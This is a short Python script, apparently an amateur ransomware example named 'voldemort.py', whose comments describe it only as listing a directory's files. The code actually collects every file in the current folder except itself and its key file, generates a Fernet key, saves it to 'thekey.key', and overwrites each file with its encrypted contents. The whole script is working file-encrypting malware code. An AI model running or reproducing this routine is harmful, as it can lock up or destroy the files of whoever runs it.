# this is the simple script for getting the all directory expect the main file from the systems & it works on both linux & windows.
# import the os for getting the system info
import os
# import the new library
from cryptography.fernet import Fernet # to use fernet you have to install cryptography first using this command pip install cryptography

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key":
        continue
    # continue check the if there is a folder & dont want to in list
    if os.path.isfile(file):
        files.append(file)
print(files)

# new fernet the code

key = Fernet.generate_key()
# print(key)

# create the key file as a write binary
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)